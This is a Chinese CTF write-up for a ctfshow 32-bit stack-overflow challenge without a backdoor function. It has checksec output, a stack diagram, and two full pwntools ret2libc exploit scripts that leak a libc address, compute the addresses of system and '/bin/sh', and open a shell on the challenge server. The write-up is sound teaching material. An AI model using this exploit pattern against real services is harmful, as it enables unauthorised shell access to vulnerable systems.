---
tags:
  - CTF
  - ctfshow
  - PWN
  - Ret2libc
  - 无后门
  - 题目
---
![[Pasted image 20260414183016.png]]
具有栈溢出漏洞
![[Pasted image 20260414183037.png]]
不过没后门函数

```bash
nullsky@Shader:/mnt/d/WorkSpaces/temp$ pwn checksec stack1
[*] '/mnt/d/WorkSpaces/temp/stack1'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

因为没开 PIE，所以我们可以获取固定的 PLT 和 GOT 地址。思路是利用 `puts` 获取远程服务器 `__libc_start_main` 的 GOT 地址，进而识别 `libc` 的版本，以此偏移得到 `system` 的地址。

栈图（可参考[[栈溢出]]）


| 高地址                   |                                  |
| --------------------- | -------------------------------- |
| `libc_start_main_got` | `libc_start_main` 的 GOT 表地址      |
| `main`                | 修改 `puts` 的返回地址为 `main` 以再次进行栈溢出 |
| `puts_plt`            | 修改 `pwnme` 的返回地址为 `puts` 的PLT地址  |
| `b'a'*13`             | 填充+EBP                           |
| 低地址                   |                                  |

`exploit.py`

```python
from pwn import *
from LibcSearcher import *
#sh = process("./stack1")
sh =remote("pwn.challenge.ctf.show",28296)
elf = ELF("./stack1")
sh.recv()
puts_plt = elf.plt["puts"]
libc_start_main_got = elf.got['__libc_start_main'] #每个程序中都会有__libc_start_main函数，就用它来找对应的libc库
main = elf.symbols['main']
print("leak libc_start_main_got addr and return to main again") #已知puts函数地址，利用puts函数泄露libc_start_main_got地址
payload = flat([b'a'*13,puts_plt,main,libc_start_main_got])
#sh=remote("pwn.challenge.ctf.show",28259)
sh.sendline(payload)
libc_start_main_addr = u32(sh.recv()[0:4])
print(hex(libc_start_main_addr))
libc = LibcSearcher('__libc_start_main',libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
sys_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')
print("get shell")
payload=b'a'*13+p32(sys_addr)+b'a'*4+p32(binsh_addr)
sh.sendline(payload)
sh.interactive()
```

更好的版本
```python
from pwn import *
from LibcSearcher import *

context.log_level = 'debug'

context.arch = 'i386'
context.os = 'linux'

# p = process(['./stack1'])
p = remote('pwn.challenge.ctf.show', 28284)

elf = ELF('./stack1')

puts_plt = elf.plt["puts"]
libc_start_main_got = elf.got['__libc_start_main']
main = elf.symbols['main']

payload = flat([b"A" * 13, puts_plt, main, libc_start_main_got])

p.recvuntil(b'32bits\n\n')
p.sendline(payload)

libc_start_main_addr = u32(p.recv(4))
print(f"[*] 获得 libc_start_main 地址：{libc_start_main_addr}")

libc = LibcSearcher('__libc_start_main', libc_start_main_addr)

p.recvuntil(b'32bits')

libcbase = libc_start_main_addr - libc.dump('__libc_start_main')

system_addr = libcbase + libc.dump('system')
str_bin_sh_addr = libcbase + libc.dump('str_bin_sh')

payload = flat([b"A" * 13, system_addr, main, str_bin_sh_addr]) 
p.sendline(payload)

p.interactive()
```